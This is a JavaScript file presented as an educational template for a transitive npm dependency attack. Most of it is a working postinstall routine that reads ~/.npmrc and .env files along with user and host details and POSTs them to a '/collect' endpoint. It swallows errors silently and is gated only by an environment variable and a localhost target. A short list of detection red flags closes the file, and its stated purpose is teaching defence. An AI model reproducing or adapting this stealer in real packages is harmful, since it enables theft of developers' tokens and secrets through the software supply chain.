/**
 * EDUCATIONAL EXAMPLE: Transitive Dependency Attack Template
 * 
 * This template demonstrates how to create a malicious transitive dependency
 * for educational purposes only.
 * 
 * ATTACK VECTOR:
 * - Compromise a package that is used as a dependency by other packages
 * - When victims install the parent package, they automatically get the compromised transitive dependency
 * - Malicious code executes even though victim never directly installed the compromised package
 * 
 * SAFETY FEATURES:
 * - Only works when TESTBENCH_MODE=enabled
 * - Only sends data to localhost
 * - Clearly marked as malicious
 * 
 * LEARNING OBJECTIVES:
 * - Understand transitive dependency attacks
 * - Learn to audit entire dependency tree
 * - Practice detection techniques
 * - Implement defense strategies
 */

const http = require('http');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ============================================================================
// MALICIOUS CODE SECTION - FOR EDUCATIONAL PURPOSES ONLY
// ============================================================================

/**
 * Post-install script that executes automatically
 * This is the attack vector - runs when package is installed
 */
function maliciousPostInstall() {
  // SAFETY CHECK: Only run in testbench environment
  if (process.env.TESTBENCH_MODE !== 'enabled') {
    return;
  }

  console.log('[TESTBENCH] Simulating transitive dependency attack...');

  // Collect system information
  const data = {
    timestamp: new Date().toISOString(),
    package: 'data-processor', // Name of compromised transitive dependency
    version: '1.2.1',
    attackType: 'transitive-dependency',
    hostname: os.hostname(),
    username: os.userInfo().username,
    platform: process.platform,
    nodeVersion: process.version,
    cwd: process.cwd(),
    env: {
      NODE_ENV: process.env.NODE_ENV,
      // In real attack, would collect more sensitive env vars
    },
    files: {}
  };

  // Try to read sensitive files (simulated)
  const sensitiveFiles = [
    path.join(os.homedir(), '.npmrc'),
    path.join(process.cwd(), '.env'),
    path.join(process.cwd(), '.env.local')
  ];

  sensitiveFiles.forEach(filePath => {
    try {
      if (fs.existsSync(filePath)) {
        data.files[filePath] = fs.readFileSync(filePath, 'utf8');
      }
    } catch (e) {
      // Silently fail
    }
  });

  // Exfiltrate data to attacker server (localhost in testbench)
  const payload = JSON.stringify(data);
  const options = {
    hostname: 'localhost',
    port: 3000,
    path: '/collect',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': payload.length
    }
  };

  const req = http.request(options, () => {
    // Data sent successfully
  });

  req.on('error', () => {
    // Silently fail
  });

  req.write(payload);
  req.end();
}

// Execute if this is a postinstall script
if (require.main === module) {
  maliciousPostInstall();
}

module.exports = { maliciousPostInstall };

// ============================================================================
// DETECTION HINTS FOR LEARNERS:
// ============================================================================
// Red flags to look for in transitive dependencies:
// 1. Postinstall scripts in packages you didn't directly install
// 2. Unexpected network requests during npm install
// 3. File system access during installation
// 4. Environment variable access
// 5. Suspicious version numbers
// 6. Packages with unusual dependency chains
// 7. Packages that appear in dependency tree unexpectedly
// ============================================================================

